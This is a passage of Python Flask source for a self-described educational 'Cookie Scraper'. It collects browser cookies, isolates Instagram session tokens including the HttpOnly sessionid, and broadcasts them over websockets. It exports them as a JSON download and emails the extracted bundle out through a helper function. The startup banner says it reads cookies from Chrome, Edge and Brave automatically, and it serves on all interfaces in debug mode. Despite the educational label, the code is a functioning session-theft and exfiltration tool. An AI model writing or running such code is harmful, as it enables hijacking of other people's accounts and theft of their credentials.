        if _is_instagram_cookie(cookie):
            instagram_by_name[cookie['name']] = cookie

    bundle = _build_instagram_bundle(instagram_by_name)
    http_only_count = sum(1 for c in normalized if c['httpOnly'])
    secure_count = sum(1 for c in normalized if c['secure'])

    with state_lock:
        scraper_state['cookies'] = normalized
        scraper_state['cookie_count'] = len(normalized)
        scraper_state['instagram_bundle'] = bundle
        scraper_state['source_browser'] = source_browser
        scraper_state['source_profile'] = source_profile

    payload = {
        'cookies': normalized,
        'total': len(normalized),
        'httpOnly_count': http_only_count,
        'secure_count': secure_count,
        'session_cookie': bundle['cookies'].get('sessionid') if bundle['cookies']['sessionid'].get('value') else None,
        'key_cookies': [bundle['cookies'][n] for n in INSTAGRAM_SESSION_COOKIES if bundle['cookies'][n].get('value')],
        'instagram_bundle': bundle,
        'source_browser': source_browser,
        'source_profile': source_profile,
    }
    socketio.emit('cookies_captured', payload)

    if payload['session_cookie']:
        socketio.emit('session_found', {
            'sessionid': payload['session_cookie'],
            'key_cookies': payload['key_cookies'],
            'instagram_bundle': bundle,
            'source_browser': source_browser,
            'source_profile': source_profile,
        })
        _log(f'sessionid: {payload["session_cookie"]["value"][:16]}... (HttpOnly: {payload["session_cookie"]["httpOnly"]})')

    if bundle['missing']:
        _log(f'Missing: {", ".join(bundle["missing"])}')
    else:
        _log('All 12 Instagram cookies extracted successfully.')

    _update_status('complete')
    _send_extracted_bundle_email(payload)
    return jsonify({'message': 'Cookies received from browser extension.', 'instagram_bundle': bundle}), 200


# backwards-compatible alias
@app.route('/api/extract-existing', methods=['POST'])
def extract_existing_alias():
    return extract_cookies()


@app.route('/api/browsers', methods=['GET'])
def list_browsers():
    """Show detected browsers (informational only)."""
    browsers = _installed_browsers()
    result = []
    for b in browsers:
        profiles = _list_profiles(b['user_data'])
        result.append({
            'id': b['id'],
            'name': b['name'],
            'running': b['running'],
            'profiles': [p['name'] for p in profiles],
        })
    return jsonify({'browsers': result})


@app.route('/api/cookies', methods=['GET'])
def get_cookies():
    with state_lock:
        return jsonify({
            'cookies': scraper_state['cookies'],
            'total': len(scraper_state['cookies']),
            'httpOnly_count': sum(1 for c in scraper_state['cookies'] if c['httpOnly']),
            'secure_count': sum(1 for c in scraper_state['cookies'] if c['secure']),
            'instagram_bundle': scraper_state['instagram_bundle'],
            'source_browser': scraper_state['source_browser'],
            'source_profile': scraper_state['source_profile'],
        })


@app.route('/api/export', methods=['GET'])
def export_cookies():
    with state_lock:
        cookies = scraper_state['cookies']
        bundle = scraper_state['instagram_bundle']

    if not cookies:
        return jsonify({'error': 'No cookies to export.'}), 400

    export_data = {
        'exported_at': datetime.now().isoformat(),
        'source_browser': scraper_state.get('source_browser'),
        'source_profile': scraper_state.get('source_profile'),
        'all_cookies': cookies,
        'instagram_bundle': bundle.get('cookies', {}),
        'instagram_header_string': bundle.get('header_string', ''),
        'instagram_found': bundle.get('found', []),
        'instagram_missing': bundle.get('missing', []),
    }

    export_path = os.path.join(os.path.dirname(__file__), 'exported_cookies.json')
    with open(export_path, 'w', encoding='utf-8') as f:
        json.dump(export_data, f, indent=4)

    return send_file(
        export_path,
        as_attachment=True,
        download_name=f'instagram_cookies_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json',
        mimetype='application/json',
    )


@app.route('/api/status', methods=['GET'])
def get_status():
    with state_lock:
        bundle = scraper_state['instagram_bundle']
        return jsonify({
            'status': scraper_state['status'],
            'is_running': scraper_state['is_running'],
            'cookie_count': scraper_state['cookie_count'],
            'start_time': scraper_state['start_time'],
            'instagram_found': bundle.get('found_count', 0),
            'instagram_total': bundle.get('total_count', len(INSTAGRAM_SESSION_COOKIES)),
            'source_browser': scraper_state.get('source_browser'),
            'source_profile': scraper_state.get('source_profile'),
        })


def _update_status(status):
    with state_lock:
        scraper_state['status'] = status
    socketio.emit('status_update', {'status': status})


if __name__ == '__main__':
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    missing = _check_dependencies()
    print("\n" + "=" * 60)
    print("  Cookie Scraper -- Educational Cybersecurity Tool")
    print("  Dashboard: http://localhost:5000")
    print("  Reads cookies from Chrome / Edge / Brave automatically")
    if missing:
        print(f"  WARNING: Missing packages: {', '.join(missing)}")
        print(f"  Run: pip install {' '.join(missing)}")
    else:
        print("  Dependencies: OK (pywin32, pycryptodome)")
    print("  WARNING: FOR EDUCATIONAL USE ONLY")
    print("=" * 60 + "\n")
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)
